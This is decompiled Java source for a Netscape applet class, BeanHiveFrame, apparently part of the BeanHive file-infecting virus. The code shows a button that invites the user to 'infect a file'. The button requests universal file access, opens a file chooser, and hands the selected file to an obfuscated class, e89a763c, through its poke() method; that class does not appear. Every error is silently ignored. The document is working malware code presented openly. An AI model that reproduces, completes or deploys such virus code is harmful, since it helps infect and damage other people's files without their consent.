// Decompiled by Jad v1.5.5.3. Copyright 1997-98 Pavel Kouznetsov.
// Jad home page:      http://web.unicom.com.cy/~kpd/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   FileSecDemo.java

import java.io.*;
import netscape.application.*;
import netscape.security.*;

public class BeanHiveFrame extends Application
    implements netscape.application.Target
{

    public void init()
    {
        netscape.application.RootView rootview = mainRootView();
        super.init();
        Font font = new Font("Times", 1, 14);
        viewSecureButton = new Button(0,0,400,30);
        viewSecureButton.setTitle("Infect a file by pressing this button!");
        viewSecureButton.setTarget(this);
        viewSecureButton.setCommand("viewSecure");
        rootview.addSubview(viewSecureButton);
        fileChooser = new FileChooser(rootview, "View File...", 0);
    }

    public void performCommand(String s, Object obj)
    {
        try
        {
            if(s.equals("viewSecure"))
            {
                try
                {
                    PrivilegeManager.enablePrivilege("UniversalFileAccess");
                    infect();
                    return;
                }
                catch(ForbiddenTargetException forbiddentargetexception)
                {
                    return;
                }
            }
        }
        catch(Throwable throwable)
        {
            return;
        }
    }

    public void infect()
    {
        try
        {
            fileChooser.showModally();
            if(fileChooser.file() == null)
            {
                return;
            }
            else
            {
                File file = new File(fileChooser.directory(), fileChooser.file());
                e89a763c vstart = new e89a763c();
                vstart.poke(file);
                return;
            }
        }
        catch(AppletSecurityException appletsecurityexception)
        {
            return;
        }
        catch(Exception exception)
        {
            return;
        }
    }
    
    Button viewSecureButton;
    FileChooser fileChooser;
}
